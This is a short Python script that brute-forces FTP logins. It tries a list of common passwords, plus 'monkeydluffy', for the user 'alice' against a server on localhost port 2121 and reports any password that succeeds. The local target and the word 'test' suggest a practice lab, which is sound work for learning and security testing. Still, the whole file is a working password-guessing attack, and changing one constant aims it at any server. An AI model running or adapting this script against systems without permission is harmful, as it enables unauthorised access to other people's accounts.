import ftplib
import time

HOST = "127.0.0.1"
PORT = 2121
USERNAME = "alice"

passwords = [
    "123456",
    "password",
    "admin",
    "root",
    "letmein",
    "qwerty",
    "dragon",
    "monkey",
    "monkeydluffy"
]

print(f"Starting FTP brute-force test against {HOST}:{PORT}")
print(f"Username: {USERNAME}")
print("-" * 50)

for password in passwords:
    print(f"Trying password: {password}")

    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=5)
        ftp.login(USERNAME, password)

        print(f"  SUCCESS: {password}")
        ftp.quit()

    except ftplib.error_perm:
        print("  Failed login")

    except Exception as e:
        print(f"  Connection/error: {e}")

    time.sleep(0.3)

print("-" * 50)
print("FTP brute-force test finished.")